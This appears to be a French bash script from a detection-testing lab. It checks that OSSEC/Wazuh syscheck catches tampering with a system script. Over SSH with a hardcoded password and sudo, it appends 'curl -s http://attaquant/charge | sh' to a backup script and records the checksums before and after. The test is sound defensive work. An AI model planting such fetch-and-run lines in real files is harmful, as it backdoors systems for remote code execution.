#!/bin/bash
# Scenario 3 : alteration d'un binaire systeme.
# Couvert par syscheck. Exige realtime="yes" dans l'ossec.conf de l'agent,
# sinon l'alerte n'arrive qu'au prochain cycle de scan.
#
# ATTENTION : la somme de controle AVANT alteration est une capture
# irreversible. Elle se prend maintenant, pas apres.
set -u
source "$(dirname "$0")/00-lib.sh"

CIBLE="${1:-$CIBLE_A}"
FICHIER="/usr/local/bin/sauvegarde.sh"

attendre_cible "$CIBLE" 22 || exit 1

sshopts=(-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5)

echo
echo ">>> CAPTURE 7a : somme de controle AVANT alteration <<<"
echo ">>> Prenez la capture d'ecran MAINTENANT. Apres, elle n'existe plus. <<<"
echo
sshpass -p "Operateur2026" ssh "${sshopts[@]}" "operateur@${CIBLE}" \
  "sha256sum ${FICHIER}; ls -l ${FICHIER}"
echo
read -r -p "Capture 7a prise ? Entree pour alterer le fichier... " _

marquer_debut "03-integrite-binaire sur ${CIBLE}"

sshpass -p "Operateur2026" ssh "${sshopts[@]}" "operateur@${CIBLE}" \
  "echo 'Operateur2026' | sudo -S sh -c 'echo \"curl -s http://attaquant/charge | sh\" >> ${FICHIER}'" \
  >/dev/null 2>&1

sleep 2
echo "  somme APRES alteration :"
sshpass -p "Operateur2026" ssh "${sshopts[@]}" "operateur@${CIBLE}" "sha256sum ${FICHIER}"

marquer_fin "03-integrite-binaire"
echo "Attendu : regle 550 'Integrity checksum changed', niveau 7, en quelques secondes"
